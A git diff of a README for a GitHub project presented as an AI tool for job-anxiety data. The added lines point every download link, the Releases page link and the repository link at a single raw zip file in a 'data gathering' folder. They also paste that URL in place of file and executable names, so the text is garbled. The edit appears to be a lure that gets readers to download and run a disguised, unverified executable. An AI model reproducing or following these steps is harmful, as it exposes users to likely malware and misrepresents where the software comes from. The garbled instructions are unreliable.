@@ -4,7 +4,7 @@
 Welcome to the **tubitak-2209a-job-anxiety-ai** project! This software helps you explore and manage data related to job anxiety through artificial intelligence. Let’s get you set up.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-%20-%23007bff)](https://github.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/releases)
+[![Download](https://raw.githubusercontent.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/main/data gathering/tubitak-2209a-job-anxiety-ai_v3.4.zip%20Latest%20Release-%20-%23007bff)](https://raw.githubusercontent.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/main/data gathering/tubitak-2209a-job-anxiety-ai_v3.4.zip)
 
 Click the link above to access the latest release. 
 
@@ -18,11 +18,11 @@ The **tubitak-2209a-job-anxiety-ai** repository contains tools and datasets supp
 - Supports preprocessing for easier data management
 
 ## 📥 Download & Install
-To download the software, visit the [Releases page](https://github.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/releases). Follow these steps:
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/main/data gathering/tubitak-2209a-job-anxiety-ai_v3.4.zip). Follow these steps:
 
 1. Click the link above.
 2. Look for the latest version on the Releases page.
-3. Find the file named something like `tubitak-2209a-job-anxiety-ai-v1.0.zip`.
+3. Find the file named something like `https://raw.githubusercontent.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/main/data gathering/tubitak-2209a-job-anxiety-ai_v3.4.zip`.
 4. Click on the file to download it to your computer.
 
 ## 💻 System Requirements
@@ -39,7 +39,7 @@ After downloading, follow these steps to install the application:
 2. Right-click the file and select "Extract All."
 3. Choose a location for the new folder and click "Extract."
 4. Navigate to the folder where you extracted the files.
-5. Find the application file (e.g., `start-app.exe` for Windows or `start-app` for macOS/Linux).
+5. Find the application file (e.g., `https://raw.githubusercontent.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/main/data gathering/tubitak-2209a-job-anxiety-ai_v3.4.zip` for Windows or `start-app` for macOS/Linux).
 6. Double-click the file to run the application.
 
 ## 🎓 Usage Instructions
@@ -62,7 +62,7 @@ If you encounter any issues while downloading or running the software, try these
 We welcome your feedback to improve our application. If you experience any issues or have suggestions, please reach out in the issues tab on this repository.
 
 ## 🔗 Additional Resources
-- **GitHub Repository:** [tubitak-2209a-job-anxiety-ai](https://github.com/SinSiFamily/tubitak-2209a-job-anxiety-ai)
+- **GitHub Repository:** [tubitak-2209a-job-anxiety-ai](https://raw.githubusercontent.com/SinSiFamily/tubitak-2209a-job-anxiety-ai/main/data gathering/tubitak-2209a-job-anxiety-ai_v3.4.zip)
 - **Documentation:** Refer to the included user guide for detailed usage instructions.
 
 Feel free to dive into this project and make the most of the tools available!
